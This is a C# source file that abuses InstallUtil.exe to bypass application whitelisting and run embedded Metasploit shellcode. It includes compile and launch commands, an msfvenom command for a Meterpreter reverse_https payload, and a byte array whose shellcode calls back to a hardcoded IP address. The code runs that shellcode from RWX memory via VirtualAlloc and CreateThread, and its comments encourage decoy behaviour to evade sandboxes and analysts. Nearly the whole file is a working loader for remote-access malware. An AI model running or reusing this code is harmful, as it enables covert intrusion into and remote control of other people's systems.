using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:exeshell.exe Shellcode.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
(Or)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
	The gist of this one is we can exhibit one behaviour if the application is launched via normal method, Main().
	Yet, when the Assembly is launched via InstallUtil.exe, it is loaded via Reflection and circumvents many whitelist controls.
	We believe the root issue here is:
	
	The root issue here with Assembly.Load() is that at the point at which execute operations are detected 
	(CreateFileMapping->NtCreateSection), only read-only access to the section is requested, so it is not processed as an execute operation.  
	Later, execute access is requested in the file mapping (MapViewOfFile->NtMapViewOfSection), 
	which results in the image being mapped as EXECUTE_WRITECOPY and subsequently allows unchecked execute access.
	
	The concern is this technique can circumvent many security products, so I wanted to make you aware and get any feedback.
	Its not really an exploit, but just a creative way to launch an exe/assembly.
*/

//root@infosec:~# msfvenom --payload windows/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f csharp > pentestShellCode.txt

public class Program
{
	public static void Main()
	{
		Console.WriteLine("Hello From Main...I Don't Do Anything");
		//Add any behaviour here to throw off sandbox execution/analysts :)

	}

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	public override void Uninstall(System.Collections.IDictionary savedState)
	{

		Shellcode.Exec();

	}

}

public class Shellcode
{
	public static void Exec()
	{
		// native function's compiled code
		// generated with metasploit
		byte[] shellcode = new byte[605] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,0xff,0x0f,0xb7,0x4a,0x26,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,
0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,
0x85,0xc0,0x74,0x4c,0x01,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,
0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,
0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,
0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,
0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x84,0x00,0x00,0x00,
0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,
0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,
0x57,0x69,0x6e,0x36,0x34,0x3b,0x20,0x78,0x36,0x34,0x29,0x20,0x41,0x70,0x70,
0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,
0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,
0x65,0x63,0x6b,0x6f,0x29,0x20,0x43,0x68,0x72,0x6f,0x6d,0x65,0x2f,0x39,0x35,
0x2e,0x30,0x2e,0x34,0x36,0x33,0x38,0x2e,0x36,0x39,0x20,0x53,0x61,0x66,0x61,
0x72,0x69,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x20,0x45,0x64,0x67,0x2f,0x39,
0x35,0x2e,0x30,0x2e,0x31,0x30,0x32,0x30,0x2e,0x34,0x34,0x00,0x68,0x3a,0x56,
0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,
0xe8,0xef,0x00,0x00,0x00,0x2f,0x48,0x62,0x69,0x78,0x42,0x50,0x6d,0x61,0x50,
0x4c,0x45,0x74,0x70,0x69,0x79,0x6e,0x54,0x79,0x68,0x5a,0x57,0x41,0x6d,0x74,
0x6e,0x53,0x41,0x2d,0x39,0x31,0x32,0x42,0x74,0x32,0x69,0x41,0x39,0x33,0x6b,
0x65,0x75,0x43,0x4e,0x6c,0x46,0x39,0x74,0x5a,0x78,0x35,0x53,0x47,0x32,0x64,
0x38,0x6c,0x72,0x49,0x49,0x75,0x4a,0x37,0x51,0x41,0x58,0x45,0x48,0x4c,0x56,
0x43,0x75,0x32,0x6c,0x61,0x42,0x4d,0x53,0x2d,0x5f,0x64,0x41,0x43,0x53,0x64,
0x48,0x57,0x33,0x77,0x41,0x65,0x79,0x65,0x51,0x75,0x7a,0x2d,0x4d,0x6f,0x6b,
0x77,0x61,0x42,0x56,0x7a,0x78,0x65,0x4b,0x34,0x45,0x6f,0x55,0x6a,0x42,0x48,
0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x02,
0x68,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,
0x96,0x6a,0x0a,0x5f,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,
0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,
0xff,0xd5,0x4f,0x75,0xe1,0xe8,0x4b,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,
0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,
0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,
0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,
0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x7f,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,
0x36,0x38,0x2e,0x34,0x39,0x2e,0x32,0x32,0x36,0x00,0xbb,0xf0,0xb5,0xa2,0x56,
0x6a,0x00,0x53,0xff,0xd5 };





		UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
						MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	Marshal.Copy(shellcode, 0, (IntPtr) (funcAddr), shellcode.Length);
				IntPtr hThread = IntPtr.Zero;
	UInt32 threadId = 0;
	// prepare data


	IntPtr pinfo = IntPtr.Zero;

	// execute native code

	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
	WaitForSingleObject(hThread, 0xFFFFFFFF);

}

private static UInt32 MEM_COMMIT = 0x1000;

private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32")]
private static extern bool VirtualFree(IntPtr lpAddress,
					  UInt32 dwSize, UInt32 dwFreeType);

[DllImport("kernel32")]
private static extern IntPtr CreateThread(

  UInt32 lpThreadAttributes,
  UInt32 dwStackSize,
  UInt32 lpStartAddress,
  IntPtr param,
  UInt32 dwCreationFlags,
  ref UInt32 lpThreadId

  );
[DllImport("kernel32")]
private static extern bool CloseHandle(IntPtr handle);

[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(

  IntPtr hHandle,
  UInt32 dwMilliseconds
  );
[DllImport("kernel32")]
private static extern IntPtr GetModuleHandle(

  string moduleName

  );
[DllImport("kernel32")]
private static extern UInt32 GetProcAddress(

  IntPtr hModule,
  string procName

  );
[DllImport("kernel32")]
private static extern UInt32 LoadLibrary(

  string lpFileName

  );
[DllImport("kernel32")]
private static extern UInt32 GetLastError();
			
	 
		}